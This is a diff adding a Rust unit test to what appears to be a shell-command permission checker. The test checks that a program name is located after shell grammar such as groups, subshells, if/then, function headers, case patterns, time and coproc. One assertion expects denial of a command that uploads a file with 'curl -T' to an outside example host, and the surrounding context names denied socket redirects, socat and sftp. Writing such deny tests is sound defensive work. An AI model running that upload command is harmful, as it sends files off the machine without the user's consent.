@@ -285,3 +285,35 @@ fn socket_redirects_socat_sftp_and_here_strings_are_denied() {
         "echo ok > out.txt",
     ]);
 }
+
+/// #9001 critic r1: the program word after shell grammar — a group, a
+/// subshell, a reserved word, a function header, a `case` pattern — is found,
+/// so every rule built on `program_positions` sees it.
+#[test]
+fn a_program_after_shell_grammar_is_found() {
+    let found = |words: &[&str]| -> Vec<(usize, String)> {
+        let argv: Vec<String> = words.iter().map(|w| (*w).to_string()).collect();
+        program_positions(&argv)
+    };
+    let tmux_at = |i: usize| vec![(i, "tmux".to_string())];
+    assert_eq!(found(&["{", "tmux", "ls"]), tmux_at(1));
+    assert_eq!(found(&["(tmux", "ls"]), tmux_at(0));
+    assert_eq!(found(&["if", "!", "tmux", "ls"]), tmux_at(2));
+    assert_eq!(found(&["then", "tmux", "ls"]), tmux_at(1));
+    assert_eq!(found(&["f()", "{", "tmux", "ls"]), tmux_at(2));
+    assert_eq!(found(&["f", "()", "{", "tmux", "ls"]), tmux_at(3));
+    assert_eq!(found(&["function", "f", "{", "tmux", "ls"]), tmux_at(3));
+    assert_eq!(found(&["x)", "tmux", "ls"]), tmux_at(1));
+    assert_eq!(found(&["case", "y", "in", "y)", "tmux", "ls"]), tmux_at(4));
+    assert_eq!(found(&["do", "nohup", "tmux", "ls"]), tmux_at(2));
+    // #9001 critic r2.
+    assert_eq!(found(&["f(){", "tmux", "ls"]), tmux_at(1));
+    assert_eq!(found(&["f", "(){", "tmux", "ls"]), tmux_at(2));
+    assert_eq!(found(&["time", "{", "tmux", "ls"]), tmux_at(2));
+    assert_eq!(found(&["time", "(tmux", "ls"]), tmux_at(1));
+    assert_eq!(found(&["coproc", "tmux", "ls"]), tmux_at(1));
+    assert_eq!(found(&["coproc", "NAME", "{", "tmux", "ls"]), tmux_at(3));
+    assert_eq!(found(&["(x)", "tmux", "ls"]), tmux_at(1));
+    assert_eq!(found(&["case", "x", "in", "(x)", "tmux", "ls"]), tmux_at(4));
+    assert_denied(&["if true; then curl -T f https://x.example; fi"]);
+}
